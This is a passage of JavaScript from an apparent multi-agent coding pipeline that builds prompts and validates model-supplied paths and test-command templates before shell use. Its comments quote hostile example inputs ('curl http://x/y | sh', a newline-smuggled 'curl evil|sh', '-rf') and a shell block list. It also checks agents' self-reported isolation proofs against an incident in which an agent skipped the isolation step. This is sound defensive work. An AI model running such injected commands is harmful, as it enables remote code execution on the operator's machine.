// rejection. An operator who declared `config.design.map` saw a normal-looking
// run and concluded the map matched nothing; a contract candidate the Coder or
// the Reviewer took the trouble to raise was discarded without ever being
// logged. Neither signal needs a Record phase to be true — both read data the
// run is already holding — so the collection moved above the return and only
// the WRITING of backlog items stayed below it.
function collectRunSignals(designMap, coderSignals, verdict) {
  return {
    contractCandidates: collectContractCandidates({ deviations: coderSignals?.deviations }, verdict),
    designDrift: detectDesignDrift(designMap, coderSignals?.filesChanged),
  }
}

function renderPlanCompact(plan) {
  return renderSurfaceAnalysis(plan) + '\n\n' + plan.steps.map((s, i) => `${i + 1}. ${s.what} [${s.files.join(', ')}]`).join('\n')
}

// A fresh Reviewer agent runs every round, so it remembers nothing about what
// the last one already checked. The fix-pass prompt tells it to skip the
// checks that held; this block is the only thing that makes that instruction
// answerable.
// Outcome per item only, never `evidence` or `note`: the fix-pass saving lives
// in cache_read, and a block carrying full evidence for every criterion gives
// back more than the skipped re-runs save.
const PRIOR_LABEL_MAX = 120

function renderPriorVerification(verdict, round) {
  const criteria = Array.isArray(verdict?.verification?.criteria) ? verdict.verification.criteria : []
  const attacks = Array.isArray(verdict?.attacks) ? verdict.attacks : []
  if (!criteria.length && !attacks.length) return ''

  const trim = s => {
    const str = String(s ?? '')
    return str.length > PRIOR_LABEL_MAX ? `${str.slice(0, PRIOR_LABEL_MAX - 1)}…` : str
  }
  const lines = [`\n\n## PREVIOUS ROUND (${round}) — WHAT WAS ALREADY CHECKED`]
  criteria.forEach(c => lines.push(`[${c?.status || 'unknown'}] ${trim(c?.criterion)}`))
  attacks.forEach(a => lines.push(`[${a?.outcome || 'unknown'}] ${trim(a?.vector)}`))
  return lines.join('\n')
}

// The Reviewer's revert-and-rerun proof needs a command naming exactly the
// test files the Coder wrote or updated — and those filenames arrive as
// CODER_SCHEMA `array of string` with no pattern, straight out of a model's
// JSON. They are only displayed today; the moment they become shell arguments
// the Reviewer's prompt is the wrong place to sanitize them, so the fully
// substituted line is built here and handed over ready to run. Returns '' when
// scoped mode is off or nothing survives the filter, in which case
// reviewer.md's existing full-suite instruction stands unchanged.
function renderScopedRevert(plan, coderResult, mode) {
  const template = plan?.codebase_context?.test_command_scoped
  if (mode !== 'scoped' || !template) return { block: '', dropped: [] }

  const { safe, dropped } = partitionTestPaths([...(coderResult?.tests?.written || []), ...(coderResult?.tests?.updated || [])])
  if (!safe.length) return { block: '', dropped }

  const droppedNote = dropped.length
    ? `\n${dropped.length} reported test path(s) could not be substituted safely and are NOT in that command: ${dropped.join(', ')}. Treat them as unproven.`
    : ''

  return {
    dropped,
    block: `\n\n### SCOPED COMMAND FOR THE REVERT PROOF\nAlready substituted and validated — run it verbatim, do not rebuild it:\n\n\`${substituteScopedPaths(template, safe)}\`\n\nThat proof only has to watch one test flip red→green, so this is the whole suite it needs.${droppedNote}`,
  }
}

// 'never' and 'ship' can only mean what they say when the intermediate runs are
// narrower than the suite. When scoping didn't take — the operator asked for
// scope 'full', or the plan carried no usable template — every run already IS
// the whole suite, so there is nothing to defer or disable, and a 'disabled'
// status would claim no wide run happened while the baseline and every per-step
// run were exactly that. README promises scope 'full' restores the previous
// behaviour exactly; honouring fullSuiteAt there would break that promise by
// under-reporting coverage the run actually took.
function effectiveFullSuiteAt(configured, scopedMode) {
  return scopedMode === 'scoped' ? configured : DEFAULT_FULL_SUITE_AT
}

// agents/coder.md ends its test section with "run the full suite — unless the
// prompt says otherwise". This is the otherwise, and without it fullSuiteAt was
// a label on the result and nothing else: the Coder ran the suite anyway, the
// status came back 'ran', and 'never' documented a gate that did not exist.
// Rendered for fix passes too — a fix pass is a pass, and one that runs the
// whole suite defeats 'never' exactly as thoroughly as the first one would.
const FULL_SUITE_DIRECTIVES = {
  ship: 'This project defers the full suite to ship time (`config.tests.fullSuiteAt: "ship"`) — `/ldo-ship` runs it before the PR merges.',
  never: 'This project never runs the full suite inside the pipeline (`config.tests.fullSuiteAt: "never"`) — the operator owns that gate.',
}

// Rendered for the Reviewer as well as the Coder: the Reviewer runs the plan's
// test_command to drive criteria, and a Reviewer running the whole suite under
// 'never' costs the same wall-clock the setting exists to avoid. Its instruction
// differs — it has no tests.full_suite field to fill, and it must not silently
// downgrade a criterion it can no longer prove.
const FULL_SUITE_ROLE_INSTRUCTIONS = {
  coder: 'Do NOT run it at the end of your pass — use the scoped command for the baseline, for every per-step run, and for your final comparison. Report `tests.full_suite` as `{ "ran": false, "command": "", "result": "" }` and say why in `deviations`; never guess a result to fill the field. Nothing else about your process changes — you still capture a baseline, still distinguish your failures from pre-existing ones, still run the scoped suite after each step.',
  reviewer: 'Do NOT run the unscoped `test_command` — use the scoped command for the revert proof and for any criterion you drive through tests. If a criterion genuinely cannot be proven without the whole suite, mark it `skipped` with that as the reason rather than running it or claiming it passed; a skipped criterion is reported as NOT PROVEN, which is the honest outcome here.',
}

function renderFullSuiteDirective(fullSuiteAt, role) {
  const why = FULL_SUITE_DIRECTIVES[fullSuiteAt]
  const how = FULL_SUITE_ROLE_INSTRUCTIONS[role]
  if (!why || !how) return ''
  return `### Do not run the full suite
${why} ${how}

`
}

function renderCoderSummary(r) {
  if (!r) return '(No summary)'
  if (typeof r === 'string') return r
  const lines = [`**Files changed**: ${r.files_changed?.join(', ') || '(none)'}`]
  if (r.summary) lines.push(`**Summary**: ${r.summary}`)
  if (r.tests?.result) lines.push(`**Tests**: ${r.tests.result}`)
  if (r.tests?.baseline?.captured) {
    lines.push(`**Baseline (before any edit)**: ${r.tests.baseline.result || '(no result recorded)'} — failing: ${(r.tests.baseline.failing || []).join(', ') || '(none)'}`)
  } else if (r.tests?.baseline) {
    lines.push(`**Baseline**: NOT CAPTURED — pre-existing and introduced failures cannot be told apart${r.tests.baseline.note ? ` (${r.tests.baseline.note})` : ''}`)
  }
  const t = [...(r.tests?.written || []), ...(r.tests?.updated || [])]
  if (t.length) lines.push(`**Test files**: ${t.join(', ')}`)
  if (r.tests?.pre_existing_failures?.length) lines.push(`**Pre-existing failures**: ${r.tests.pre_existing_failures.join('; ')}`)
  if (r.env?.actions?.length) lines.push(`**Env actions**: ${r.env.actions.join('; ')}`)
  if (r.env?.unresolved?.length) lines.push(`**Env unresolved**: ${r.env.unresolved.join('; ')}`)
  if (r.docs_updated?.length) lines.push(`**Docs**: ${r.docs_updated.join(', ')}`)
  if (r.deviations?.length) lines.push(`**Deviations**: ${r.deviations.join('; ')}`)
  return lines.join('\n')
}

// Full threat model when the Security agent ran; otherwise the Planner's own
// notes, so a `low` surface still reaches the Coder without an extra agent.
function renderSecurity(sec, plan) {
  if (sec?.status === 'findings' && sec.findings?.length) {
    const lines = ['## SECURITY THREAT MODEL (mitigations are hard requirements)']
    sec.findings.forEach((f, i) => {
      const stepRef = f.plan_step ? ` (plan step: ${f.plan_step})` : ''
      lines.push(`${i + 1}. [${f.severity}] ${f.category}: ${f.what}${stepRef}`)
      lines.push(`   Mitigation: ${f.mitigation}`)
    })
    if (sec.threat_model_notes) lines.push(`\nNotes: ${sec.threat_model_notes}`)
    return lines.join('\n') + '\n\n'
  }
  if (!sec && plan?.security_notes?.length && plan.security_surface !== 'none') {
    return '## SECURITY NOTES (handle these carefully)\n'
      + plan.security_notes.map(n => `- ${n}`).join('\n') + '\n\n'
  }
  return ''
}

// Multi-feature isolation. Suggested paths/branches are always derived through
// slugify() before they're ever interpolated into a prompt as a literal shell
// command — an operator-supplied label lands in "git worktree add <this>", so it
// must be shell-safe by construction, not by hoping the agent notices.
const SAFE_SLUG = /^[a-z0-9][a-z0-9-]*$/

function slugify(text, fallback) {
  const s = String(text || '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 40)
    .replace(/-+$/, '')
  return SAFE_SLUG.test(s) ? s : fallback
}

// Same reasoning as SAFE_SLUG above: plan.migrations.directory originates in
// Planner output derived from task text (often pasted from an issue tracker,
// not the operator's own keyboard), and it reaches a shell command in the
// Reviewer's collision check. Character-class validation alone lets through
// paths like `.git/hooks`, `.`, or `-rf` that are syntactically safe but a
// bad write/scan target — so reject by path segment, not by regex alone.
const SAFE_REL_PATH = /^[A-Za-z0-9._\/-]+$/

// The one implementation of the rule set. It exists as a shared function
// because safeTestPath used to be a second copy of it and had already drifted
// on four input classes — `a//b`, `a/./b`, a dot-prefixed segment and a
// trailing slash — which is exactly what the comment beside safeWorktreePath
// warns about: two validators for one class of value drift apart, and the
// divergence is itself the defect.
//
// Returns the normalized path or null, never a boolean, so a caller cannot
// validate one spelling and go on to use another.
//
// Deliberately NOT trimmed: safeTestPath trims its own input, which is the
// behaviour its model-supplied paths already had, while this path — migrations
// directories and worktree paths — has always rejected a whitespace-padded
// value outright, since SAFE_REL_PATH has no space in its class. A trim here
// would widen the stricter caller silently.
// Deliberately typed: a non-string is rejected rather than coerced. `String(123)`
// used to make `123` a valid migrations directory, and a number that reached
// this slot is a malformed plan, not a directory somebody meant.
function safeRelPathSegments(value, { allowDotPrefix = false } = {}) {
  if (typeof value !== 'string' || !value) return null
  if (!SAFE_REL_PATH.test(value) || value.startsWith('/')) return null
  const normalized = value.replace(/\/+$/, '')
  // An empty segment — `a//b` — is rejected for the same reason `.` and `-`
  // are: the rule here is per-segment, and `''.startsWith('.')` is false, so
  // without this the checks beside it wave it through. Reachable only by a
  // fabricated value (no real `git rev-parse --show-toplevel` emits `//`),
  // which is exactly the input this validator exists for.
  // `.` and `..` are rejected as WHOLE segments whatever allowDotPrefix says:
  // that exception is for directories that happen to be hidden, never for the
  // two names meaning "here" and "one level up".
  const bad = seg => !seg || seg === '.' || seg === '..' || seg.startsWith('-') || (!allowDotPrefix && seg.startsWith('.'))
  return normalized.split('/').some(bad) ? null : normalized
}

function safeMigrationsDir(dir) {
  return safeRelPathSegments(dir)
}

// ── Isolation proof ────────────────────────
//
// Everything the isolator reports is untrusted model text. Exactly two values
// survive validation and reach a later prompt (path and branch); the rest is
// evidence consumed once, here, and never stored or forwarded — worktree_list
// alone is the absolute path and branch of every worktree on the operator's
// machine, including unrelated projects.
//
// Bound before scanning, the same order safeScopedTemplate uses: path and
// branch are interpolated into the ISOLATION block that is prepended to every
// Planner, Security, Coder, Reviewer and Recorder prompt for the rest of the
// run, and worktree_list is porcelain of unknown length that parseWorktreeList
// walks block by block.
const ISOLATION_FIELD_MAX = 200
const ISOLATION_LIST_MAX = 65536
const ISOLATION_ENTRY_MAX = 200
const ISOLATION_REQUIRED = ['worktree_path', 'branch', 'main_root', 'base_head', 'toplevel', 'git_dir', 'head_branch', 'head_sha', 'worktree_list']
const ISOLATION_PREFIX = '.worktrees/'
// A linked worktree's --absolute-git-dir is `<root>/.git/worktrees/<name>`; a
// main checkout returns `<root>/.git`. The prefix is deliberately unanchored to
// main_root: running LDO from inside an existing worktree points the new one's
// git dir at the ORIGINAL repository, and requiring the prefix to match would
// reject a perfectly correct nested run.
const ISOLATION_GIT_DIR = /^\/.*\/\.git\/worktrees\/[^/]+$/
const SAFE_ISOLATION_BRANCH = /^ldo\/[A-Za-z0-9][A-Za-z0-9._-]*$/
const SAFE_ISOLATION_SHA = /^[0-9a-f]{7,64}$/

// The only segment allowed to start with a dot is the fixed literal prefix, so
// the remainder is handed to safeMigrationsDir rather than re-checked by a
// second copy of the same rules — two validators for one class of value drift
// apart, and the divergence is itself the defect. That rule now holds across
// the file: safeMigrationsDir and safeTestPath are both thin callers of
// safeRelPathSegments, differing only in the one flag each documents. A
// character class alone would call `.worktrees/-rf` and `.worktrees/..`
// well-formed.
function safeWorktreePath(p) {
  const s = String(p || '').trim().replace(/\/+$/, '')
  if (!s.startsWith(ISOLATION_PREFIX)) return null
  const rest = safeMigrationsDir(s.slice(ISOLATION_PREFIX.length))
  return rest ? ISOLATION_PREFIX + rest : null
}

// `git worktree list --porcelain` emits blank-line-separated blocks whose lines
// are `worktree <path>`, `HEAD <sha>`, `branch refs/heads/<name>`, plus any of
// `bare`, `detached`, `locked`, `prunable`. Never split on space — a worktree
// path may contain one, the same reasoning agents/reviewer.md documents for the
// same class of value — and never assume line position: a block whose first
// line is `bare` would otherwise yield a mangled path that still gets compared
// against the reported toplevel. A bare repository has no working tree, so it
// can never be the entry being proven, and is dropped.
function parseWorktreeList(text) {
  const s = String(text || '')
  if (!s || s.length > ISOLATION_LIST_MAX) return []
  const entries = []
  for (const block of s.split(/\n\s*\n/)) {
    if (entries.length >= ISOLATION_ENTRY_MAX) break
    let path = null
    let branch = null
    let bare = false
    for (const raw of block.split('\n')) {
      const line = raw.trim()
      if (line === 'bare') bare = true
      else if (line.startsWith('worktree ')) path = line.slice('worktree '.length).trim()
      else if (line.startsWith('branch ')) branch = line.slice('branch '.length).trim()
    }
    if (path && !bare) entries.push({ path, branch })
  }
  return entries
}

// Pure, so the gate can drive every rejection shape without a filesystem. Each
// check carries its own fixed reason string — fixed, because the reason is
// logged and a model-authored value interpolated into it forges journal lines
// (see quoteRejected); and distinct, because "isolation failed" tells an
// operator nothing about whether the agent skipped the step, adopted an old
// branch, or hit an exhausted suffix range.
//
// The checks are orthogonal consistency checks, not cryptographic proof: four
// deliberately fabricated, mutually consistent git outputs still pass. That is
// a different failure mode from the one observed in issue #12, which was
// omission — and omission cannot produce a git_dir of the linked-worktree shape
// from a run that never left the main checkout.
function verifyWorktreeProof(proof) {
  if (!proof || typeof proof !== 'object' || Array.isArray(proof)) return { ok: false, reason: 'no isolation report was returned' }
  const f = {}
  for (const key of ISOLATION_REQUIRED) {
    const v = String(proof[key] ?? '').trim()
    if (!v) return { ok: false, reason: `a required field is missing or blank: ${key}` }
    f[key] = v
  }
  if (f.worktree_path.length > ISOLATION_FIELD_MAX) return { ok: false, reason: 'worktree_path is over the length limit' }
  if (f.branch.length > ISOLATION_FIELD_MAX) return { ok: false, reason: 'branch is over the length limit' }
  const wp = safeWorktreePath(f.worktree_path)
  if (!wp) return { ok: false, reason: 'worktree_path is not a safe relative path under .worktrees/' }
  if (!SAFE_ISOLATION_BRANCH.test(f.branch)) return { ok: false, reason: 'branch is not of the form ldo/<name>' }
  // Catches an agent that created the worktree and then checked something else
  // out in it, and an agent reporting HEAD from the main checkout.
  if (f.head_branch !== f.branch) return { ok: false, reason: 'HEAD inside the worktree is not on the reported branch' }
  if (!f.toplevel.startsWith('/')) return { ok: false, reason: 'toplevel is not an absolute path' }
  // The exact shape of issue #12: the agent never created anything and ran the
  // four commands where it stood, so every output describes the main checkout.
  if (f.toplevel === f.main_root) return { ok: false, reason: 'toplevel is the main checkout — no worktree was entered' }
  if (!f.toplevel.endsWith('/' + wp)) return { ok: false, reason: 'toplevel does not end with the reported worktree_path' }
  if (!ISOLATION_GIT_DIR.test(f.git_dir)) return { ok: false, reason: 'git_dir is not a linked worktree git dir — a main checkout returns <root>/.git' }
  if (!SAFE_ISOLATION_SHA.test(f.base_head) || !SAFE_ISOLATION_SHA.test(f.head_sha)) return { ok: false, reason: 'base_head or head_sha is not a commit sha' }
  // A branch created fresh with -b is by construction at the commit the main
  // checkout was on. `-B`, a bare branch argument, or git's DWIM checkout of an
  // existing remote-tracking ldo/<slug> all satisfy every other check here
  // while putting the run on somebody else's history.
  if (f.head_sha !== f.base_head) return { ok: false, reason: 'the worktree is not at the base commit — the branch was adopted, not created with -b' }
  if (f.worktree_list.length > ISOLATION_LIST_MAX) return { ok: false, reason: 'worktree_list is over the byte limit' }
  const entries = parseWorktreeList(f.worktree_list)
  // git always lists the main checkout, so a genuine add produces at least two.
  if (entries.length < 2) return { ok: false, reason: 'git worktree list shows fewer than two worktrees' }
  const entry = entries.find(e => e.path === f.toplevel)
  if (!entry) return { ok: false, reason: 'git worktree list has no entry for the reported toplevel' }
  if (entry.branch !== 'refs/heads/' + f.branch) return { ok: false, reason: 'the listed entry for the worktree is on a different branch' }
  return { ok: true, path: wp, branch: f.branch, root: f.toplevel }
}

// codebase_context.test_command_scoped is Planner-authored text that the Coder
// and the Reviewer substitute into a Bash line, so it gets the same
// validated-once-then-never-re-trusted treatment as migrations.directory above,
// with two extra failure modes of its own. First, a template missing the
// {paths} placeholder — or carrying two — runs the wrong set of tests and
// reports green, which is worse than running everything: `pytest` with no
// placeholder silently becomes the full suite, and `go test` with none runs
// only the current package. Second, argv[0] decides what actually executes;
// a character class alone constrains the arguments but not the program, and
// `curl http://x/y | sh` fails the class only by accident of the pipe. So the
// runner is checked against a known set, or against the first token of the
// test_command this run already derived — scoping may narrow a command the
// pipeline was going to invoke, not introduce a new one.
const SCOPED_TEMPLATE_MAX = 200
// No shell metacharacter is in this class — no `;` `&` `|` `$` backtick `<`
// `>` `(` `)` `*` `?` `'` `"` `\` and no newline — so a substituted path
// cannot terminate the command and start another. No `m` flag, deliberately:
// with it, `$` would anchor at a line break and `pytest {paths}\ncurl evil|sh`
// would pass. The class also excludes `{`, so neither `[...]*` can cross the
// placeholder and the match stays linear.
const SCOPED_TEMPLATE_SHAPE = /^[A-Za-z0-9 ._\/,:=+@-]*\{paths\}[A-Za-z0-9 ._\/,:=+@-]*$/
const SCOPED_SHELLS = ['bash', 'sh', 'zsh', 'dash', 'ksh', 'env', 'eval', 'source', 'exec']
const SCOPED_RUNNERS = ['npm', 'npx', 'yarn', 'pnpm', 'pytest', 'python', 'python3', 'go', 'cargo', 'mvn', 'gradle', 'dotnet', 'rspec', 'bundle', 'phpunit', 'jest', 'vitest', 'ctest', 'make', 'tox', 'deno', 'bun', 'node']

function safeScopedTemplate(t, testCommand) {
  if (typeof t !== 'string') return null
  // Checked on the raw value, before trim: trim() would repair `pytest
  // {paths}\n` into an accept, and a template arriving with a line break in it
  // was pasted from a file or from command output rather than authored as one
  // command. Repairing that guesses which half was meant.
  if (/[\r\n]/.test(t)) return null
  const s = t.trim()
  // Length before the regex: a pathological input is then rejected by a
  // comparison rather than by a scan.
  if (!s || s.length > SCOPED_TEMPLATE_MAX) return null
  if (!SCOPED_TEMPLATE_SHAPE.test(s)) return null
  if (s.split('{paths}').length !== 2) return null
  const tokens = s.split(/ +/).filter(Boolean)
  // An absolute or relative path as argv[0] runs a program from the repo (or
  // from anywhere); as a later argument it points the runner at a target
  // nobody chose. Same segment-level rejection as safeMigrationsDir, and for
  // the same reason: the character class calls `.git/hooks` well-formed.
  if (tokens.some(tok => tok !== '{paths}' && (tok.startsWith('/') || tok.startsWith('.')))) return null
  const runner = tokens[0]
  const baseRunner = String(testCommand || '').trim().split(/ +/)[0]
  // A shell is rejected even when it IS the project's own runner. The
  // baseRunner escape hatch exists so an unusual test command still scopes, but
  // `bash {paths}` substituted over the matched files means "execute these
  // files", not "test these files" — and the files are whatever the plan
  // touched, Markdown included. A live run handed exactly that template over
  // .md files; the Coder refused it and ran the real suite, which is the
  // correct outcome reached by the wrong mechanism.
  if (SCOPED_SHELLS.includes(runner)) return null
  if (!SCOPED_RUNNERS.includes(runner) && runner !== baseRunner) return null
  return s
}

// Rejected values are by definition the ones holding metacharacters, newlines
// or arbitrary length — a raw interpolation lets one forge extra lines in the
// run journal, and a command line scraped from a config file can carry a
// token. Same treatment the stallMs rejection already gives its value.
// Must be total over anything a JSON-parsed (or recovered) plan can hold:
// JSON.stringify returns the VALUE undefined — not a string — for undefined, a
// function or a symbol, and every call site here is a log line on a rejection
// path, i.e. exactly where a TypeError would replace a degraded-but-running
// feature with a dead one.
function quoteRejected(value) {
  const s = JSON.stringify(value) ?? String(value)
  return s.length > 120 ? `${s.slice(0, 119)}…` : s
}

// A recovered plan (args.resumePlan) reaches renderPlan and every downstream
// prompt — Security, Coder, Reviewer, Recorder — with no Planner call in
// between to catch a malformed shape. Running the pipeline on a broken plan
// object is strictly worse than re-planning (bad shape corrupts every prompt
// built from it), so this validates it before phasePlan ever assigns it to
// `plan`. Checks PLAN_SCHEMA's required fields; optional fields stay optional,
// but are shape-checked when present, because absent and malformed are not the
// same thing to the code that reads them. Plus bounds a live Planner call is
// implicitly subject to but a file-sourced object is not: a live call's step count and output size are bounded by the
// model's output budget, and its worktree_path is one it just cd'd into
// itself. A recovered object has none of those guarantees, so they're
// checked explicitly here instead of assumed.
function resumePlanRejection(p) {
  if (!p || typeof p !== 'object' || Array.isArray(p)) return 'not a plan object'
  if (!['trivial', 'medium', 'complex'].includes(p.complexity)) return 'complexity is not trivial|medium|complex'
  if (typeof p.summary !== 'string' || !p.summary.trim()) return 'summary is missing'
  if (unresolvedSurfaceCoverage(p).length) return 'surface_analysis is missing, malformed, unresolved, or lacks evidence'
  if (
    !Array.isArray(p.steps) ||
    p.steps.length === 0 ||
    p.steps.some(s => !s || typeof s.what !== 'string' || !s.what.trim() || !Array.isArray(s.files) || typeof s.acceptance !== 'string' || !s.acceptance.trim())
  ) {
    return 'steps are missing or malformed'
  }
  if (
    !p.codebase_context ||
    typeof p.codebase_context !== 'object' ||
    typeof p.codebase_context.stack !== 'string' ||
    !Array.isArray(p.codebase_context.relevant_files)
  ) {
    return 'codebase_context is missing or malformed'
  }
  // relevant_files, security_notes, risks, conflicts, migrations and sizing are
  // every optional field phasePlan/renderContext/renderMigrations/renderConflicts/renderSplitPaste
  // iterate or dereference (.map, .forEach, .join, .label, .task, .slice)
  // with no type guard of their own, because a live Planner call always
  // produces them in schema shape. A recovered object carries no such
  // guarantee, so a bad element in any of them would otherwise reach those
  // call sites as an uncaught TypeError instead of a rejection.
  if (p.codebase_context.relevant_files.some(f => !f || typeof f !== 'object' || typeof f.path !== 'string')) {
    return 'relevant_files entries are malformed'
  }
  if (p.security_notes !== undefined && (!Array.isArray(p.security_notes) || p.security_notes.some(n => typeof n !== 'string'))) {
    return 'security_notes is malformed'
  }
  // security_surface is checked for a different reason than the fields around
  // it: it doesn't crash anything, it gates a whole phase. securityEnabled
  // compares it against 'elevated', and the missing-rating safety net below
  // tests !plan.security_surface — so any non-empty garbage ('Elevated',
  // 'nope', {}) is truthy enough to defeat the net and falsy enough to skip
  // the threat model, silently. The enum comes from PLAN_SCHEMA so the two
  // cannot drift apart.
  if (p.security_surface !== undefined && !PLAN_SCHEMA.properties.security_surface.enum.includes(p.security_surface)) {
    return `security_surface is not ${PLAN_SCHEMA.properties.security_surface.enum.join('|')}`
  }
  if (p.risks !== undefined && (!Array.isArray(p.risks) || p.risks.some(r => typeof r !== 'string'))) {
    return 'risks is malformed'
  }
  if (p.conflicts !== undefined && (!Array.isArray(p.conflicts) || p.conflicts.some(c => typeof c !== 'string'))) {
    return 'conflicts is malformed'
  }
  if (p.migrations !== undefined) {
    if (!p.migrations || typeof p.migrations !== 'object' || Array.isArray(p.migrations)) return 'migrations is malformed'
    if (p.migrations.identifiers !== undefined && (!Array.isArray(p.migrations.identifiers) || p.migrations.identifiers.some(id => typeof id !== 'string'))) {
      return 'migrations is malformed'
    }
  }
  if (p.sizing !== undefined) {
    if (!p.sizing || typeof p.sizing !== 'object' || Array.isArray(p.sizing)) return 'sizing is malformed'
    if (p.sizing.suggested_split !== undefined) {
      if (!Array.isArray(p.sizing.suggested_split)) return 'sizing is malformed'
      if (
        p.sizing.suggested_split.some(
          c => !c || typeof c !== 'object' || typeof c.label !== 'string' || typeof c.task !== 'string' || (c.depends_on !== undefined && !Array.isArray(c.depends_on))
        )
      ) {
        return 'sizing is malformed'
      }
    }
  }
  // A Planner call is bounded by MAX_STEPS_PER_RUN in its prompt and by the
  // model's output budget in practice; a file-sourced object is bounded by
  // neither, so both get an explicit ceiling here. 4x is generous on purpose
  // — a false positive on a legitimately large plan costs one Planner call,
  // not a broken run.
  if (p.steps.length > MAX_STEPS_PER_RUN * 4) return 'too many steps for a recovered plan'
  let size = 0
  try {
    size = JSON.stringify(p).length
  } catch {
    return 'not serializable'
  }
  if (size > 256_000) return 'recovered plan is implausibly large'
  // Belt-and-braces. The live control is the ctx.isMulti rejection in
  // phasePlan — no recovered plan reaches here in a mode where worktree_path
  // does anything, so today this branch cannot fire on a dangerous value.
  // It is here for the day that restriction is relaxed: worktree_path would
  // then flow into renderWorktree's "cd there before anything else"
  // instruction and into verifyAgentLocation, which compares an agent's
  // self-report against this same string — an attacker-chosen path would
  // validate itself. Do not delete the isMulti gate believing this covers it.
  // A worktree path is relative-by-construction wherever one is produced
  // today (the `.worktrees/<label>` hints), so absolute or `..`-bearing is
  // never legitimate.
  if (p.worktree_path !== undefined) {
    const wp = String(p.worktree_path || '').trim()
    if (wp.startsWith('/') || wp.split('/').includes('..')) return 'worktree_path is unsafe'
  }
  return null
}

function renderWorktree(worktreePath, branch, label) {
  if (!worktreePath || !branch) return ''
  const labelLine = label ? ` This feature's label is \`${label}\` — use it wherever a per-feature filename is called for.` : ''
  return `## ISOLATION\nYour work happens in \`${worktreePath}\` on branch \`${branch}\`. cd there before anything else and verify with \`pwd\` / \`git rev-parse --show-toplevel\`. Other features are running in sibling worktrees right now — never touch the main tree or another feature's directory.${labelLine}\n\n`
}

function renderResearch(r) {
  if (!r) return ''
  const lines = ['## RESEARCH FINDINGS', r.summary, '']
  if (r.findings?.length) {
    lines.push('### Findings')
    r.findings.forEach(f => lines.push(`- [${f.confidence}] ${f.claim}`))
  }
  if (r.recommendations?.length) {
    lines.push('', '### Recommendations')
    r.recommendations.forEach(x => lines.push(`- ${x}`))
  }
  if (r.contract_candidates?.length) {
    lines.push('', '### Contract candidates (operator decision required via /ldo-contract)')
    r.contract_candidates.forEach(c => lines.push(`- [${c.surface_id}] ${c.kind} → ${c.target}: ${c.rule}\n  Evidence: ${(c.evidence || []).join('; ')}`))
  }
  if (r.gaps?.length) lines.push('', '### Unanswered\n' + r.gaps.map(g => `- ${g}`).join('\n'))
  return lines.join('\n') + '\n\n'
}

// Returns log lines, not a prompt string — this one is read by the operator,
// who may paste the args.tasks array straight back into a Workflow call. The
// chunks are model-generated free text, so the array is emitted through
// JSON.stringify and never by concatenation: a task containing a quote or a
// newline would otherwise hand the operator invalid JSON to run.
// Dependent chunks are listed apart from the paste block rather than sorted
// into it, because args.tasks runs features in PARALLEL worktrees — a batch
// whose members depend on each other produces N conflicting worktrees.
function renderSplitPaste(sizing, conflicts = []) {
  if (sizing?.fits_one_run !== false) return []
  const chunks = sizing.suggested_split || []
  // "Several runs" with no runs named is a Planner self-contradiction. Say so
  // rather than returning nothing: the rating line still prints above this, so
  // silence here leaves the operator told to split and not told into what.
  if (!chunks.length) return ['⚠ Planner rated this as several runs but suggested no split — re-run with planOnly, or split it by hand.']

  const independent = chunks.filter(c => !c.depends_on?.length)
  const dependent = chunks.filter(c => c.depends_on?.length)

  const lines = [`Suggested split — ${chunks.length} run(s). Dependent chunks must NOT go in the same batch: args.tasks runs features in parallel worktrees.`]
  if (independent.length) {
    lines.push('Paste this to run the independent chunks in parallel:')
    lines.push(`  Workflow({name:"ldo", args:{tasks:${JSON.stringify(independent.map(c => ({ label: c.label, task: c.task })))}}})`)
  }
  if (dependent.length) {
    lines.push('Run these afterwards, in sequence — each depends on a chunk above:')
    dependent.forEach(c => lines.push(`  [${c.label}] after ${c.depends_on.join(', ')}`))
  }
  // The exact route issue #19's contradiction travelled: the unreconciled DDL
  // rode out of the plan into a generated chunk task, and the fresh Planner that
  // picked that chunk up never saw the plan, the conflict, or the prose that
  // contradicted it. The chunks above are self-contained by design, which is
  // precisely why nothing carries a conflict into them.
  const open = (Array.isArray(conflicts) ? conflicts : []).filter(c => String(c ?? '').trim())
  if (open.length) {
    lines.push(`⚠ The ${open.length} unresolved conflict(s) above are NOT carried into these chunk tasks — a fresh Planner never sees this plan. Paste each one into the chunk it belongs to before running it.`)
  }
  return lines
}

// ═══════════════════════════════════════════
// MODEL ROUTING
// ═══════════════════════════════════════════

// The reason the protocol exists: Reviewer runs on a stronger model than Coder.
// Model names mean whatever your setup routes them to — no assumption is made
// about which is more capable.
//
// The tiers genuinely differ. A typo doesn't need Sonnet to plan it or Opus to
// review it, so trivial work runs cheap end to end. Medium is the default shape:
// Sonnet writes, Opus checks. Complex additionally buys a stronger Coder and
// Reviewer, because a wrong approach on a big change is the expensive kind of
// wrong.
// planner is 'opus' in every tier deliberately, not by coincidence: complexity
// is the Planner's own output, so it structurally cannot gate its own model —
// only its call under the 'medium' row is ever actually read (see
// prePlanModels below), which is also why trivial/complex.planner exist here
// only for shape consistency, not because they take effect independently.
// coder is 'opus' in every tier, and that inverts what this table used to say.
// The old shape put the cheap model on the Coder and the strong one on the
// Reviewer, on the theory that catching what the Coder missed is the premise of
// the protocol. Field experience across weeks of daily runs says otherwise, and
// the measured cost model explains why: a run's cost tracks TURNS, not agents —
// 2.4-3.2k output tokens per tool call, stable across five runs of different
// shape — and the number of turns is set by the number of review rounds. A weak
// Coder buys rounds, and every round is a full Coder AND Reviewer pass. Paying
// opus once is cheaper than paying sonnet three times plus three reviews, and
// the code that comes out is the thing every later pass is reasoning about. Put
// the strong model where the work is; verification against a named list is the
// more mechanical half.
// reviewer and reviewerFix are 'sonnet' in every tier for the same reason, and
// reviewerFix stays equal to reviewer so lowering one does not silently
// desynchronise the pair. The honest caveat: a weaker Reviewer is a real trade,
// not a free one. Round 1 is an open-ended search for unknown defects, and a
// measured run once found a genuine new major on round 4. This table takes that
// trade deliberately; `config.models` is how an operator takes it back.
// planner is 'opus' in every tier deliberately — see the note above about it
// structurally not being able to gate its own model.
// No 'fable' anywhere, and no 'haiku' anywhere. Both were removed as defaults
// rather than as judgments about the models. `fable` is not on every proxy
// route, and REVIEWER_FALLBACK quietly rewrote it to 'sonnet' for anyone
// without one — so the declared default and the effective one had already
// drifted apart, and only the Reviewer has a fallback at all: a Coder routed to
// an unavailable model fails the run rather than degrading. `haiku` was the
// trivial Coder while every haiku sub-agent this project ran died on `400
// clear_thinking_20251015 strategy requires thinking to be enabled` — 6 of 6,
// against 0 of 47 on every other model, always on the second request, the first
